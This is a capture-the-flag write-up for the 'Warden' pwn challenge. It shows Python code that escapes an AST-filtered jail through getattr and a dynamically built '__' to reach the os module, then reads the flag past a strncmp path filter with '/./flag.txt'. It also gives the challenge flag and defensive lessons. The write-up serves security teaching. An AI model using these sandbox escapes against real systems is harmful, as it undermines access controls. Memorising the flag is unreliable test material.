# Warden

- **Category**: PWN
- **Points**: 500
- **Difficulty**: Hard
- **Platform**: 0xfun CTF
- **Remote**: `nc chall.0xfun.org 23662`

## Description
> The Warden watches every syscall. But who watches the Warden?
> Suffering ends in 30 minutes.

## Flag
`0xfun{wh0_w4tch3s_th3_w4rd3n_t0ctou_r4c3}`

## Analysis

### Architecture
Two components working together:

1. **`warden` (C binary)**: Seccomp supervisor using `SECCOMP_RET_USER_NOTIF`
   - Forks child, installs seccomp filter, drops child to uid/gid 1000
   - Parent receives syscall notifications and decides allow/block
   - Uses `process_vm_readv` to read path arguments from tracee memory

2. **`jail.py` (Python jail)**: Restricted Python execution environment
   - AST validation blocks: imports, `__` attributes, `__` in string literals, blocked builtins
   - Limited safe builtins (but includes `getattr`, `setattr`, `chr`, `type`, etc.)

### Warden Path Check (the vulnerability)
```c
static int is_path_blocked(const char *path) {
    for (int i = 0; BLOCKED_PATHS[i] != NULL; i++) {
        if (strncmp(path, BLOCKED_PATHS[i], strlen(BLOCKED_PATHS[i])) == 0)
            return 1;
    }
    return 0;
}
```

Blocked paths: `/flag`, `/root`, `/etc/shadow`, `/etc/gshadow`, `/proc/self/mem`, `/proc/self/exe`, `/proc/self/root`

**Bug**: Uses `strncmp` prefix matching on the raw path string. Path `/./flag.txt` does NOT match prefix `/flag` because:
- `strncmp("/./flag.txt", "/flag", 5)` compares `"/./fl"` vs `"/flag"` → mismatch at index 1 (`.` != `f`)
- But the kernel resolves `/./flag.txt` to `/flag.txt` (same file!)

### Python Jail Bypass
The jail blocks `.__attr` where attr starts with `_` in the AST, and blocks string literals containing `__`. But:

1. `getattr(obj, name)` is allowed (it's a function call, not attribute syntax)
2. `chr(95)*2` produces `"__"` at runtime without literal `"__"` in source

This gives full access to dunder attributes via `getattr()`.

## Exploitation

### Step 1: Python jail escape
```python
u = chr(95)*2  # "__" built dynamically
obj = getattr(getattr((), u+'class'+u), u+'bases'+u)[0]  # object
subs = getattr(obj, u+'subclasses'+u)()  # object.__subclasses__()
# Find class with os module in __init__.__globals__
for s in subs:
    g = getattr(getattr(s, u+'init'+u), u+'globals'+u)
    if 'os' in g:
        os_mod = g['os']
        break
```

### Step 2: Bypass warden path check
```python
fd = os_mod.open('/./flag.txt', 0)  # "/./flag.txt" bypasses strncmp("/flag",...)
data = os_mod.read(fd, 4096)
print(data)
```

The warden sees path `/./flag.txt`, checks against `/flag` prefix → no match → allows.
The kernel resolves `/./flag.txt` → `/flag.txt` → opens the flag file.

## Key Lessons

1. **Path canonicalization bypasses**: `strncmp` on raw paths is trivially bypassed with `/./`, `/../`, `//` etc. Use `realpath()` or check the resolved path.

2. **Python jail `getattr` escape**: If `getattr()` is available, ANY AST-level attribute restriction is meaningless. The classic `().__class__.__bases__[0].__subclasses__()` chain works with `getattr()` + `chr()`.

3. **The intended vuln was TOCTOU** (flag name hints at it), but the path bypass is much simpler. The `SECCOMP_USER_NOTIF_FLAG_CONTINUE` + `process_vm_readv` pattern is vulnerable to TOCTOU races where another thread modifies the path between check and use.

4. **Defense in depth failure**: The warden's path-based blocking + Python jail were both independently bypassed. Neither alone would have been sufficient.

## Files
- `solve.py` - Complete exploit
- `warden.c` - Warden source code
- `jail.py` - Python jail source
- `warden` - Binary
